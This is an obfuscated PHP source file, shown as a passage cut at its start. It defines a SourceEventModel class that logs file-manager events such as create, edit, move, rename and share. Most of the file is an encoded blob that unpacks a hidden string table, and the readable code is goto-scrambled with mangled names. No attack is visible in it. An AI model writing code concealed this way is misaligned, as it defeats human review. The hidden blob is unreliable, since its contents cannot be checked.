1d\x26\xb".base64_decode('ZCuEuhLEIUVTonGTKEmCMxZq2ZBexwA6ornWATXf1AhV0LE1FNynE2IA3LGo51ux7yfDmVMTYFUH')."\53\252\23\220\104\53\124\345\263\226\101\57\62\377\377\113\200\265\240\172\360\377\377\245\100\35\11\217\11\26\231\170\321\124\214\377\252\14\312\340\130\127\141\355\244\166\262\52\64\110\215\365\365\122\160\61\104"."\43\51\123\205\134\264\223\11\57\300\343\103\126\151\254\227\221\224\113\364\275\333\14\234\144\152\276\100\175\141\42\106\5\6\76\64\20\142\216\357\64\353\162\20\261\160\153\322\260\44\345\324\144\264\241\12\177"."\22\156\62\100\336\161\326\16\270\266\227\24\230\106\73\13\143\142\126\226\154\105\137\301\134\214\201\55\210\240\100\214\11\46\171\266\150\200\302\70\66\116\143\350\111\270\16\265\253\171\370\110\256\211\170\33\206"."\x30\x4\x6d\x34\xaf\xd0\x49\xf\xf3\x43\x73\x41\x37\x2\xba\x39\x63\x86\xf9\x30\x22\xcb\x47\x7c\x87\xb6\xfb\x71\xd1\xa\x44\xa1\x30\x6b\xab\xa0\x71\x58\x3b\x9d\x15\x5a\x41\x1e\x29\x2a\xc\xde\x6a\x9b\x25\xac\xcd\x28\x13\x23\x3"."\x5b\x8f\x51\x2c\x4b\xd7\x32\x72\xc1\x45\xc2\x47\xe9\x9c\x11\xf4\xd\xce\x80\xf2\x78\x85\x68\x95\xa0\x3\x69\x27\xe0\x27\xa5\x32\x96\x5c\x46\xb\x70\x40\x27\xe5\x89\x93\x2e\xe2\xdf\xba\xb2\x62\x65\x5e\xba\xb0\x22\x62\xc3\xc1\xa5"."\116\337\130\1\324\121\111\202\225\32\154\330\307\55\166\307\356\25\330\340\4\137\333\325\325\72\151\200\71\175\42\267\74\304\107\102\11\55\123\204\111\103\151\224\204\113\140\76\100\247\261\311\6\73\240\221\142"."\153\251\24\74\216\40\61\202\205\366\223\64\13\336\54\322\130\41\53\347\25\203\306\100\126\121\260\135\42\146\134\142\315\310\120\151\262\160\266\56\126\75\206\155\56\11\144\54\126\120\262\370\260\4\131\303\121"."\370\370\44\360\104\126\207\336\345\222\142\134\315\301\53\106\231\125\122\7\42\73\340\106\303\24\47\255\53\112\336\2\211\147\213\212\5\40\147\13\31\31\101\60\200\74\153\321\31\167\167\246\335\235\272\273\223".base64_decode('bLX/B/98jySTVYv4zaKPYaAG4p00dMKTpi9J2ODwaq5iQoFKdaNcYycj6NII6PCyGt1JCCkhzWRr')."\53\67\134\102\111\251\54\325\350\362\367\54\214\165\5\374\175\61\44\342\7\173\43\236\200\55\1\360\314\210\277\263\14\334\21\244\76\175\155\265\216\347\254\32\147\152\36\55\363\175\334\235\20\210\312\6\363".strrev('='."\0".'šXÔÌjq¨¿²n;™?4""EwWU7&…2ÎNF<6mjnë‹Îç'."\0".'4Ğ<’E\\Ki').base64_decode('hQRDntAy7tQYpEQ8oUlSYB7iJJD6rZu7YMEC+tRpIovNM6GJALsvB1B4+qSUQ+VyTKiBh2yaLPft')."\41\131\367\340\26\124\110\134\256\26\46\111\124\13\364\241\312\2\325\122\57\24\351\145\66\73\116\23\374\2\315\42\277\364\171\221\370\4\175\302\205\276\303\220\220\111\176\225\76\224\221\236\200\252\157\64\14"."\126\232\54\77\307\104\72\305\103\122\247\234\257\66\245\40\100\233\53\365\100\103\246\174\132\232\0\55\307\136\254\15\356\135\304\310\50\331\154\14\252\274\221\352\46\62\232\144\337\100\322\350\344\337\340\305\20".base64_decode('cJHqa0DmCSpIJhWZycJtP3ebQQwKXS6ixAO9LQBmYkVCnkmpGwV0bBADfE5wYAklJQkuLcgKwuIv')."\x67\xb1\x96\x24\xc3\xd6\x8a\x9d\xe4\x24\x95\xb1\xb9\x12\xf2\x0\x45\x7c\x95\x57\x76\xba\x84\x3e\x23\x81\xcf\x40\x53\x31\x9\x1b\xf9\x5a\x14\x4\x31\x42\x19\xa4\xd5\xa2\x67\x88\x13\xca\x2b\x3c\xbd\xbe\xa1\x5e\xb0\xe8\xf0\x77\xfa".strrev('íê'."\n".'_MÚáì’'."\0".'àŸ^«dõtX`ÁSX?İ\'JI4Xì–M	â’M	~	¬wş§à5èaE±Â')."\17\20\376\25\45\24\34\45\274\270\223\250\67\105\213\323\353\233\251\261\17\177\272\23\366\115\114\170\140\33\37\231\341\260\206\166\150\70\54\45\144\154\24\23\127\260\124\240\44\241\363\127\130\73\311\0\262".base64_decode('MuXkR0PPzm53jWtG7bSjcyIsWgeB0Tr30f2kGkdzGECYxuDuFTVVa6prXXU10YZapr4VpVZm0WiR')."\x28\x3f\xd\xad\x6e\x5e\xcb\xfd\x4c\x46\x7\x5d\x75\xd1\xa1\x69\x82\x36\xd9\x6a\x0\x58\xcb\x0\xa3\x19\x7a\x1e\x86\xbc\x5f\x30\x2c\xa3\xae\x66\xb0\xaa\x7a\xc8\x55\x37\xb8\x22\x1a\x1d\x82\xc1\x5a\x0\x6b\x85\xf0\x68\xd8\x55\x57"."\xeb\x98\x3f\xcd\xdd\xaf\x1a\x22\x3e\xf6\x96\x3d\x29\xe\xe9\x72\x6a\x67\x56\x60\x87\xfb\x50\x64\x51\xc1\x2e\x9\x59\x52\x88\xfa\xb4\x7d\x3e\xc0\x94\x5\xf7\x79\x66\xae\x20\x90\x2d\xf4\xa1\xd4\xd2\x2c\x2a\xa6\x63\x8\x5d\x52\x8a"."\164\355\103\101\152\274\125\340\12\372\126\145\132\26\265\314\226\172\251\3\210\152\26\213\152\213\217\77\241\166\372\14\241\240\230\350\46\23\101\304\67\123\140\134\170\51\126\250\53\220\327\4\307\60\260\40\352"."\x4d\x89\x8\x2\xb2\x91\x99\xc4\x93\x10\x76\xea\x1\x1a\x20\xd4\x9\xb1\x16\x17\xdc\xf0\xb\xb\x6d\xb7\xcd\x2d\x17\xd9\x46\x95\xf7\x21\xe\x3\x42\x26\x53\xb\xe1\x81\x4f\xa1\x7d\xd\xf5\x75\xc2\x75\xc2\x47\xe3\xa4\x7\x60\x1f".base64_decode('x2wfZObaWWE7ynVgkDTBtbBolIpICbkA72uS+GQcdDz5Ngv190FneJATxOgZqgDy9/pjYf9yX1kC').base64_decode('9PtcOQWs9xE/FX8EeG8Q+Z+zwPt7F/cGByqhRnr6uCwhJHV6eiMxYU+KNytgy8V2K1RhPaEnmhrj').base64_decode('bJoxv2xUliczha753M3CmJPp79P9jpd7RyHZ0MErqQLyFUMyiKc4YrJDqniGwzZUxJDDdjwZV/My')."\xf5\x5c\x9b\xa3\xdf\xce\x31\x6b\x38\xe8\x30\x8a\x3a\xd9\x41\x96\x6b\x54\x32\x10\xef\xae\xb\xec\x2\x90\x98\x8b\xe9\x20\x55\x47\x6\xde\xc2\x99\x5d\xde\xc\x29\x69\x31\x1a\xd0\x98\xce\x1e\x5a\xcd\x2b\x14\x1\xdf\x25\x12\xc\x4d"."\xe0\x26\xc5\x93\x30\x8b\xe2\xfb\x47\xc2\xd3\xf0\x20\xb6\x90\xbb\x60\x15\xcc\xf4\x9c\xd\x12\x6b\x51\xc\x97\x8c\x23\x33\x84\x4\xac\x29\x5e\xc1\xd4\xcf\xe6\x45\x1\xd9\xce\xe2\xc9\x8b\x2c\xca\xc3\xc5\x38\xf3\x85\x63\xb3\xcd\xa3"."\356\141\45\321\52\216\72\200\205\5\240\47\173\140\13\14\61\15\24\13\137\206\346\55\23\263\240\157\226\145\301\151\320\170\215\263\62\61\305\200\12\131\375\124\354\252\224\122\341\123\50\111\350\321\4\335\307"."\121\377\166\244\223\170\137\231\264\277\33\235\115\304\121\212\350\101\226\230\276\221\316\165\66\112\2\171\101\336\43\120\4\76\215\140\335\310\215\71\263\34\107\203\336\37\24\76\370\334\130\20\277\47\304\206\26"."\x3d\x3c\xc4\x62\xba\x60\x48\xa6\x24\xe9\xd0\xa1\x87\x7b\x2a\xae\x25\x18\x88\x5e\xf6\xe9\xaf\x94\x8e\x3b\xb\x26\x7b\x2d\xae\x3e\x6d\x8\x60\xca\x5b\xd3\xd1\x17\xc5\xca\xa4\xf0\x2b\x4e\x16\x97\x87\xb6\x42\x74\x9c\xe6\x55\xb8\x63".strrev('ã=YJ¦·°a¥6±q-+Ì\\ñ>å€Æˆàí&IêíõRü;?¸c¼àFA÷° M{ƒ·‹”').base64_decode('zAk6GEm0jvfIY3ygWISmMjo1LBHsZtKSm4EY1qgSZ2ybMNLuPjcDddBuYm/eEENp+OKAWGiQyKyj')."\330\2\212\360\322\126\346\171\223\156\211\106\163\152\102\12\4\27\302\375\270\327\37\136\54\245\25\123\342\202\20\272\270\260\316\174\344\14\2\35\364\121\302\217\123\265\26\24\164\242\103\21\247\305\355\20\333"."\xa5\x88\x2e\x39\x61\x41\x65\x5\xe3\x51\x17\x8b\x83\x27\x2a\xce\x24\x33\x9c\xb5\xe1\x52\xc1\xa1\x2c\x87\xf8\x7d\x21\xf\xdc\xe5\x58\x79\x5\x2\x93\xfd\x8f\xb5\x9c\x71\x5\xde\xd\x54\xfe\x76\xb1\xc2\x77\x9\x7e\x96\x9f\xa7\x8"."\31\324\174\111\65\124\316\6\150\127\215\213\370\145\175\211\232\42\40\100\47\144\334\232\234\165\53\373\116\231\225\63\217\143\34\362\342\231\140\117\213\207\104\174\5\120\130\41\240\57\3\260\374\162\375\267\2"."\165\116\103\256\334\51\155\220\250\160\173\155\171\56\220\44\203\335\241\254\122\122\307\141\41\107\310\277\260\73\62\131\161\145\330\152\222\277\5\150\253\214\232\244\22\44\363\7\16\344\106\124\36\326\344\261\324".base64_decode('CSorcN7h9zrQQ23cwSwKAhnTAY+8UAUc/No+hi6OybRSNWTUSmw5McwfjCFBlUTddrE5hQxEkcWR')."\340\372\310\115\217\41\231\177\160\170\32\355\243\216\170\134\46\15\101\60\267\106\205\31\351\43\145\264\262\70\152\367\227\233\261\310\315\345\270\40\115\342\346\366\14\101\152\223\352\221\327\6\356\333\124\232\107"."\137\21\200\215\307\46\320\350\241\66\137\256\140\132\314\243\273\125\203\277\6\202\104\7\276\105\202\362\230\226\33\57\3\130\354\357\3\264\32\314\305\52\64\55\311\247\64\261\145\210\145\371\0\153\160\240\20"."\x36\xbb\x76\xc0\xd3\x6b\xb3\xf\x11\x41\x40\x29\x29\xd6\xec\x93\x96\x65\xd8\x79\x3d\x17\x41\xc0\x9c\x86\x86\x22\x5c\x57\x99\x42\x4\x81\xc3\xc2\x3d\x51\x44\x20\x36\x64\xb8\x2a\xb8\xdc\xa7\xbf\xd0\x6f\xe\x13\x4c\x61\x7d\x85\x2"."\211\271\123\224\374\122\106\151\57\32\14\140\47\121\47\241\124\12\243\145\211\75\12\327\137\43\165\165\330\170\77\164\111\47\347\31\303\201\303\10\220\260\313\42\20\340\23\201\246\11\124\203\65\333\103\330\345"."\243\13\373\320\240\42\114\132\145\176\135\55\150\144\226\200\335\6\77\167\264\171\173\41\313\42\366\374\122\314\373\361\123\4\26\250\56\110\352\242\217\140\354\377\206\173\171\47\350\340\153\175\330\341\15\231\307"."\x62\x91\xd4\xe9\x10\xfa\x81\xb2\x3c\x20\x73\x66\x11\xed\x2e\x77\x52\x4\x5d\x52\x32\xa9\x83\xbb\x70\x25\x1e\xa3\x5c\xa2\x28\x4d\x10\xa4\x79\x12\x9d\x66\x86\x69\x21\x3f\x28\xa9\x0\x21\xc6\x81\x2\x88\xa6\x45\x79\xab\x32\xd4\x42"."\323\10\205\15\30\172\207\222\215\35\354\121\362\343\125\122\114\22\205\161\276\145\21\37\133\241\115\300\244\122\366\15\364\13\367\343\16\334\106\7\43\27\325\10\40\115\105\43\214\345\62\7\167\324\357\300\307".base64_decode('/MgehvMU3h10IqQV/kFYw4j4cYsAaJf9WC/ZMoTsPRnRyl00cK9M+WKOu78CEassjHcJ1LnFtzS3')."\250\147\35\110\313\326\101\237\40\164\340\207\154\35\226\42\120\205\142\246\320\140\46\204\331\206\253\354\143\377\101\351\304\341\57\222\203\201\104\201\175\136\340\244\126\164\107\122\31\115\265\320\45\330\210\362\323".base64_decode('Z/zSacHOX5flko1NM+eIW08+jNyVDrkVIApD9JSNEYZkpTOJPq8qzmyUaPVbTB7EFfiijX/9R9PB')."\123\111\112\305\231\204\303\60\126\262\320\5\225\276\362\377\137\17\34\247\222\50\164\371\312\143\126\107\155\144\273\311\223\5\131\123\224\212\301\150\170\330\374\62\63\301\174\166\334\336\144\374\34\350\177\136\151".base64_decode('KhzKVldcKJWvs5B90C/TE+K0bdXES7UwtsI5iWIGoWU+GXlhKwJSLGjCygliTGjgb4jBitGaTLJ3').strrev('ñ©•Æ0'."\n".'¼¢·€sŞÈYç ò?ÍÑf„’¤¯6–&œüè¯rğ¬µ2 €ÀV½W—s ').base64_decode('U7M+KROkR4Bg92uRhUGcm1AJMy9pA4pyiTCTwQxTBXmWCHpcckINFZwbkf017ykPIeukQ3yvGEQZ')."\xd5\x91\x35\x85\xcc\x7d\xe4\x55\x19\x7f\x56\x58\x41\xf8\x62\xc1\x43\xbd\xd4\xca\x0\x46\x84\xd3\x25\x24\x7f\xb2\xc4\x8c\x28\x9a\xc2\x67\xaf\x70\x88\xa\x5a\xac\x16\x88\xcf\x55\x9a\x0\xb8\x12\x90\xfa\xc8\x32\x86\x82\x94\xb7\x42".base64_decode('NWRk/QvzkN6z8grUoG9ZC2FxzKu3sLCKvHuKmErIyGGJkQiX8ZAGt3AbheLMXyt9sIy+YyYz1zLQ')."\47\17\333\175\341\323\52\202\222\315\362\165\102\174\144\46\33\227\165\27\40\247\141\223\372\60\253\24\21\337\122\250\260\151\240\22\10\157\100\136\115\14\127\360\131\4\73\33\152\367\10\54\132\130\330\312\320"."\70\327\0\353\37\323\312\243\41\44\74\103\221\210\274\307\156\171\331\43\310\156\253\153\211\277\273\241\5\164\366\303\51\107\217\274\304\211\157\1\225\261\213\210\145\255\260\0\305\356\41\104\0\275\346\123\172"."\xb0\xe4\x80\x3e\x8e\x3a\x4\x99\x1b\x23\x19\x62\xdf\x5a\x4e\xea\xca\x5d\x58\x95\xe7\x66\x13\x50\xcc\xc2\x97\xb\x1c\x8f\x81\x8a\x5a\xf7\xc0\x62\xd1\xf8\x86\x19\xee\xf3\x42\x70\x4b\xe6\xb2\x15\xcf\x66\x4c\xc5\x59\xa2\x1a\xf8\xe4"."\120\334\167\200\220\130\121\72\315\372\164\15\255\376\126\50\133\3\4\113\47\101\13\51\154\147\124\266\323\114\40\254\13\47\375\370\305\117\374\124\73\174\256\20\260\53\51\334\337\123\203\334\237\103\0\14\340"."\127\343\126\22\141\144\245\64\125\22\376\303\157\7\326\300\144\130\310\112\311\337\313\137\157\256\225\370\233\167\342\173\360\360\330\253\113\143\164\0\157\56\5\45\27\353\143\16\320\377\262\165\16\264\127\102\113"."\x68\xba\x21\xa0\x9\xcf\x95\x1c\xb\xdd\xd2\xe3\x60\x8f\x9a\xa7\x6f\x88\x10\xd2\xa6\xd9\xc9\x48\xe0\x58\xa5\xf2\xc1\xc0\x87\x4d\xcb\x10\x41\xf9\x8d\xa\x8d\x40\x2c\x96\xf8\x80\xa2\xdd\x1e\xde\xc0\x59\xf6\x71\x44\xf9\x47\x4\x9"."\x7\x55\x50\xc3\xdd\xea\x75\x16\x25\x22\x30\x7d\x25\x94\x94\x20\x9c\xc0\x5b\xef\x42\xd8\x33\xe7\x65\x7c\xab\xa8\x6\x84\x64\x94\x8b\x3e\x46\x7\x7e\xe1\x3b\xf\x7e\xee\x2\x2\x25\xe3\xf3\x41\x4f\x49\x66\x8a\x31\xf6\x5c\xfd\x16"."\141\130\270\71\111\40\202\344\73\26\224\61\16\152\211\376\361\24\124\173\16\63\243\352\311\16\65\237\264\343\27\363\161\6\345\350\140\60\72\52\201\201\40\305\131\267\15\56\254\62\234\171\312\45\176\212\316"."\x45\xd0\x64\xb2\x4b\x2e\x55\x40\x65\x6\xdb\xc\xa\x20\xc\x15\x49\x3e\xc2\x73\x34\xdc\x5d\xb1\x32\x2a\x7e\x9d\xe0\xa5\xca\xd7\x18\x88\x58\xe\xe5\xcf\xd5\xd8\xdb\x85\xa6\x11\x83\x93\xcb\x8c\xbc\xe0\xd8\x8d\x90\x1b\x7\x21\x9c"."\4\363\371\207\213\202\316\237\135\320\237\66\167\6\210\353\310\166\222\374\223\326\127\165\30\32\223\312\0\16\122\175\167\132\240\66\217\311\360\54\216\256\266\266\44\262\215\25\212\257\270\333\265\220\102\100\50"."\116\274\73\231\64\103\270\362\107\70\275\132\273\130\170\201\210\47\320\105\115\263\164\276\300\133\131\303\10\146\110\114\264\124\307\76\264\150\367\300\351\22\3\163\350\240\13\247\171\254\111\30\137\261\325\136\314".strrev('ÌÓ%–óœ^b¦DÍU×’Í©rsœ6b¨×«DjµÙKÍ„Bò\\ß±îĞöÓùSÉõ—¡Îo`')."\302\76\134\310\147\312\105\143\222\346\225\167\36\232\106\266\256\43\15\346\156\315\5\324\311\372\263\42\162\371\347\10\361\330\261\321\376\271\162\55\52\236\3\114\126\213\212\310\223\326\202\143\333\156\113\53\361"."\103\232\122\201\3\362\313\315\162\136\313\323\52\134\265\342\62\341\102\34\262\150\43\226\45\213\367\266\225\157\166\103\25\147\261\141\275\162\265\301\305\216\341\256\44\211\163\311\341\74\365\306\4\262\163\57\207"."\xd0\xe2\xd2\xa3\xdb\x3b\x87\xca\x76\x36\xbf\xc1\x94\xf6\xf2\x45\xc1\x57\x6d\x45\xc7\xc3\xe\xb8\xe1\x2d\xdf\x51\x66\xa9\xaf\x2e\xd1\x2d\x33\xde\x89\x68\xa6\x9a\x10\x54\x3c\x20\x50\xf4\x2c\x8c\xd3\xe9\x47\xb2\xfc\x68\x8c\x48\x2".strrev('é×i\\öt^ïuÛõØN#h¼ï——ó¿Y¿]ôæıw«Œë±Ğ¾¿”û>ï—÷vºï»Éûs¿,j+Î–ø')."\307\303\304\363\117\175\173\353\355\370\337\235\127\155\171\347\306\173\166\337\175\43\106\331\271\151\313\73\233\256\336\175\356\306\135\247\335\261\353\202\313\166\235\167\332\121\102\247\200\172\353\334\101\241\345\166\261"."\102\272\213\237\310\132\334\143\243\27\336\230\261\73\226\0\310\231\64\276\170\101\112\77\4\322\61\16\367\153\16\274\260\342\344\260\246\233\320\10\36\54\10\5\364\333\241\231\46\345\123\100\252\106\230\110\116"."\104\76\166\204\353\144\20\342\157\376\302\41\104\307\341\210\330\21\123\102\101\162\5\4\367\266\141\5\247\42\126\146\211\300\143\166\26\11\225\237\247\167\25\155\167\116\34\0\166\245\161\155\214\320\32\172\234"."\207\327\7\236\207\223\156\261\313\202\374\155\6\102\354\342\345\70\322\122\63\334\70\305\115\64\332\235\250\14\47\171\106\222\151\264\221\354\111\64\71\231\227\316\157\53\201\34\21\362\42\360\73\347\350\230\251".base64_decode('NxiJ+Zb6w5FwWVKfJxweCIa8WCu2LBnlEjQRypL6uoO9k6X5ejz+QFka1EyAurr0pVOc5O9DtfQE')."\x2\x54\x35\xae\xbc\x16\xfe\xce\xc5\xbc\x26\xe8\xae\x8d\x9f\x3\x17\x32\x1a\x3d\x56\xb5\xa9\xed\xd0\x63\xf3\xb0\x4c\x67\xa3\xf8\xb8\x87\x92\x63\xc7\x5c\x42\x11\xd6\x23\x8\x71\x98\xd\xfa\xfa\x2e\xb\x14\xca\xb6\x28\x82\x74\x1"."\xb5\x7\x7a\x49\x61\x21\xea\x80\x12\x3e\x13\xcf\x38\xb\x13\x97\x51\x83\x44\xd5\x24\x7e\x9b\xe8\xb2\xdc\x3a\xa\x70\x34\x59\x10\x7f\x13\x88\x50\x5c\xbb\x11\x80\xa8\xd2\xda\xee\x78\x6c\x1d\x58\x7e\xc7\x69\xbf\x37\xe4\x1d\x2\xeb"."\275\210\72\240\130\245\305\205\213\43\314\2\55\314\117\324\377\300\141\113\62\340\55\21\55\42\247\11\57\201\322\14\217\165\214\213\141\361\254\244\235\261\22\123\116\323\33\176\73\227\27\256\264\141\57\375\77"."\167\67\306\255\255\305\0\0"."", 10, -8))); goto aèóĞÀ×¥Å; bƒÎ Îğª©: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\x63\145\x5f\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\x54\151\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\x65\x72\164", "\x66\x75\x6e\x63\164\151\157\x6e"), array("\144\145\163\143", '', "\151\x6e\163\x65\162\164\x2c\x75\x70\144\x61\164\x65\54\x73\145\154\145\143\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($fÇßÌ‹©Ğó, $däÕ¶„Ï±Ä, $eÆìóËä·º = '') { goto e‡Á¨ä”Ñƒ; e‡Á¨ä”Ñƒ: $fà®¢ƒ±ÜÇ =& $_SERVER[©]; if (!$this->eventSave) { return; } $FÄàÂ÷Ä”¹ = Model($fà®¢ƒ±ÜÇ[1114])->sourceInfo($fÇßÌ‹©Ğó); goto C²áÕ‡‚ô; C²áÕ‡‚ô: if (!$FÄàÂ÷Ä”¹) { return !1; } if ($this->isCacheEvent($FÄàÂ÷Ä”¹, $däÕ¶„Ï±Ä)) { return; } if ($eÆìóËä·º && is_string($eÆìóËä·º)) { $eÆìóËä·º = array($fà®¢ƒ±ÜÇ[2132] => $eÆìóËä·º); } goto EŠîšÜ¦ãâ; EŠîšÜ¦ãâ: $EâŠõ¾Ù´ã = array($fà®¢ƒ±ÜÇ[391] => $fÇßÌ‹©Ğó, $fà®¢ƒ±ÜÇ[2280] => $FÄàÂ÷Ä”¹[$fà®¢ƒ±ÜÇ[469]], $fà®¢ƒ±ÜÇ[2281] => $FÄàÂ÷Ä”¹[$fà®¢ƒ±ÜÇ[38]], $fà®¢ƒ±ÜÇ[474] => $FÄàÂ÷Ä”¹[$fà®¢ƒ±ÜÇ[474]], $fà®¢ƒ±ÜÇ[1425] => USER_ID, $fà®¢ƒ±ÜÇ[396] => $däÕ¶„Ï±Ä, $fà®¢ƒ±ÜÇ[1427] => $eÆìóËä·º); $this->addSystemLog($däÕ¶„Ï±Ä, $EâŠõ¾Ù´ã); return $this->add($EâŠõ¾Ù´ã); goto fÁ¶¬ÈÒÈ¤; fÁ¶¬ÈÒÈ¤: } private function addSystemLog($cÍ‹Ğª›Ó™, $E°†ÑõÁÄ) { $D¶áÇÏº¹” =& $_SERVER[©]; if ($cÍ‹Ğª›Ó™ == $D¶áÇÏº¹”[2282]) { $cÍ‹Ğª›Ó™ = $E°†ÑõÁÄ[$D¶áÇÏº¹”[413]][$D¶áÇÏº¹”[2283]]; } else { if (in_array($cÍ‹Ğª›Ó™, array($D¶áÇÏº¹”[2079], $D¶áÇÏº¹”[2284]))) { $cÍ‹Ğª›Ó™ = $E°†ÑõÁÄ[$D¶áÇÏº¹”[413]][$D¶áÇÏº¹”[691]]; } } $d…Óƒœ¥§£ = array_merge($E°†ÑõÁÄ, array($D¶áÇÏº¹”[2285] => $E°†ÑõÁÄ[$D¶áÇÏº¹”[377]], $D¶áÇÏº¹”[2286] => $E°†ÑõÁÄ[$D¶áÇÏº¹”[2286]])); Model($D¶áÇÏº¹”[2042])->addLog($D¶áÇÏº¹”[2287] . $cÍ‹Ğª›Ó™, $d…Óƒœ¥§£); } private function isCacheEvent($bÙÇ˜ìµš‰, $E•Ò»”Úª˜) { if ($bÙÇ˜ìµš‰[$_SERVER[©][379]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($dŞÊæÕ­”Ñ, $DìñÉ‚àÕç) { $e˜¥†’µƒ =& $_SERVER[©]; $e„¦ç›„ß = Model($e˜¥†’µƒ[1114])->sourceInfo($dŞÊæÕ­”Ñ); $b®šÚåƒ•’ = array($e˜¥†’µƒ[2283] => $DìñÉ‚àÕç, $e˜¥†’µƒ[38] => $e„¦ç›„ß[$e˜¥†’µƒ[38]]); return $this->addEvent($dŞÊæÕ­”Ñ, $e˜¥†’µƒ[2282], $b®šÚåƒ•’); } public function eventFileEdit($dø¢Éî’í˜) { $aº…¼Æé¿ =& $_SERVER[©]; $AÊàŠÖÜíÀ = array($aº…¼Æé¿[2288] => $_SERVER[$aº…¼Æé¿[2289]], $aº…¼Æé¿[1748] => strtolower(ACTION)); return $this->addEvent($dø¢Éî’í˜, $aº…¼Æé¿[2069], $AÊàŠÖÜíÀ); } public function eventRecycle($dæ›…ƒ¾Ÿ, $AïíÂè…¡˜) { return $this->addEvent($dæ›…ƒ¾Ÿ, $_SERVER[©][2284], $AïíÂè…¡˜); } public function eventRemove($eÃšæ½Õ) { $eóÍôÖ° =& $_SERVER[©]; $AªšÜ´‹Ç“ = Model($eóÍôÖ°[1114])->sourceInfo($eÃšæ½Õ); $FŸ•ø¼ßÓÅ = $AªšÜ´‹Ç“[$eóÍôÖ°[38]]; return $this->addEvent($AªšÜ´‹Ç“[$eóÍôÖ°[469]], $eóÍôÖ°[2068], $FŸ•ø¼ßÓÅ); } public function eventShare($CŸ¯·”õÑÅ, $E¸µ¬Û³Ê) { return $this->addEvent($CŸ¯·”õÑÅ, $_SERVER[©][2079], $E¸µ¬Û³Ê); } public function eventMove($c„»Š‘¥á†, $b‚ñë©„È‘, $EÉˆÓË¾«È) { goto E™˜´ß£†Ñ; fßìÂ‰ë¿Š: $this->addEvent($b‚ñë©„È‘, $bÖÌ‰ŠÃ…[2294], $C¦®é„‘×Ú); goto EÓŒŠØàÅÏ; cºâÛ¸´ÜÊ: $this->addEvent($c„»Š‘¥á†, $bÖÌ‰ŠÃ…[500], $C¦®é„‘×Ú); $c›¾§Öò˜Ï = $BÛ…Ù‹×øë->sourceInfo($c„»Š‘¥á†); $C¦®é„‘×Ú = array($bÖÌ‰ŠÃ…[377] => $c›¾§Öò˜Ï[$bÖÌ‰ŠÃ…[377]], $bÖÌ‰ŠÃ…[38] => $c›¾§Öò˜Ï[$bÖÌ‰ŠÃ…[38]]); goto fßìÂ‰ë¿Š; E™˜´ß£†Ñ: $bÖÌ‰ŠÃ… =& $_SERVER[©]; $BÛ…Ù‹×øë = Model($bÖÌ‰ŠÃ…[1114]); $c›¾§Öò˜Ï = $BÛ…Ù‹×øë->sourceInfo($c„»Š‘¥á†); goto dĞÆíùÀÚ ; dĞÆíùÀÚ : $AåŞî¬öİ† = $BÛ…Ù‹×øë->sourceInfo($b‚ñë©„È‘); $C­´¶Ãæˆ = $BÛ…Ù‹×øë->sourceInfo($EÉˆÓË¾«È); $C¦®é„‘×Ú = array($bÖÌ‰ŠÃ…[1004] => $b‚ñë©„È‘, $bÖÌ‰ŠÃ…[2290] => $AåŞî¬öİ†[$bÖÌ‰ŠÃ…[38]], $bÖÌ‰ŠÃ…[2291] => $AåŞî¬öİ†[$bÖÌ‰ŠÃ…[474]], $bÖÌ‰ŠÃ…[1005] => $EÉˆÓË¾«È, $bÖÌ‰ŠÃ…[2292] => $C­´¶Ãæˆ[$bÖÌ‰ŠÃ…[38]], $bÖÌ‰ŠÃ…[2293] => $C­´¶Ãæˆ[$bÖÌ‰ŠÃ…[474]]); goto cºâÛ¸´ÜÊ; EÓŒŠØàÅÏ: } public function eventCopy($c£Û²æš‚‹) { $this->eventCreate($c£Û²æš‚‹, $_SERVER[©][498]); } public function eventRename($F¿èö³°–¸, $d²‰§ºÖô¼, $eÆÏóË‰) { $F¤Â‘ëğÉÕ =& $_SERVER[©]; $dÙâçŠº¶ç = array($F¤Â‘ëğÉÕ[1004] => $d²‰§ºÖô¼, $F¤Â‘ëğÉÕ[1005] => $eÆÏóË‰); return $this->addEvent($F¿èö³°–¸, $F¤Â‘ëğÉÕ[1127], $dÙâçŠº¶ç); } public function eventAddComment($fñ•—œÌÁ, $F¥ÑéÕ·¨) { return $this->addEvent($fñ•—œÌÁ, $_SERVER[©][2295], $F¥ÑéÕ·¨); } public function eventAddDesc($Añ¦•Áª¾Ì, $c¡…™ÀË) { return $this->addEvent($Añ¦•Áª¾Ì, $_SERVER[©][2296], $c¡…™ÀË); } public function listBySource($C½Éö‘…ÑÓ) { goto Fö¤ì­ÈÉó; dˆùñ’ÇœË: if ($C˜Ó§‚¡ëğ[$E¿‰§–‹îø[378]] == $E¿‰§–‹îø[93]) { $EçÚá‰×ŠÌ = Model($E¿‰§–‹îø[1114])->listSearchChildren($C½Éö‘…ÑÓ, 20000); $EçÚá‰×ŠÌ[] = $C½Éö‘…ÑÓ . $E¿‰§–‹îø[13]; $FØÜÖç³« = array($E¿‰§–‹îø[377] => array($E¿‰§–‹îø[17], $EçÚá‰×ŠÌ)); } $CÊß„…Á—ˆ = $this->where($FØÜÖç³«)->order($E¿‰§–‹îø[2297])->selectPage(); if ($CÊß„…Á—ˆ[$E¿‰§–‹îø[360]][$E¿‰§–‹îø[361]] == 0) { $CÊß„…Á—ˆ[$E¿‰§–‹îø[360]][$E¿‰§–‹îø[361]] = 1; $CÊß„…Á—ˆ[$E¿‰§–‹îø[363]] = array(array($E¿‰§–‹îø[391] => $C½Éö‘…ÑÓ, $E¿‰§–‹îø[2280] => $C˜Ó§‚¡ëğ[$E¿‰§–‹îø[469]], $E¿‰§–‹îø[1425] => $C˜Ó§‚¡ëğ[$E¿‰§–‹îø[386]], $E¿‰§–‹îø[396] => $E¿‰§–‹îø[2298], $E¿‰§–‹îø[397] => $C˜Ó§‚¡ëğ[$E¿‰§–‹îø[197]], $E¿‰§–‹îø[1427] => $E¿‰§–‹îø[43])); } goto B–…çÙ°™¹; Fö¤ì­ÈÉó: $E¿‰§–‹îø =& $_SERVER[©]; $C˜Ó§‚¡ëğ = Model($E¿‰§–‹îø[1114])->sourceInfo($C½Éö‘…ÑÓ); $FØÜÖç³« = array($E¿‰§–‹îø[391] => $C½Éö‘…ÑÓ); goto dˆùñ’ÇœË; 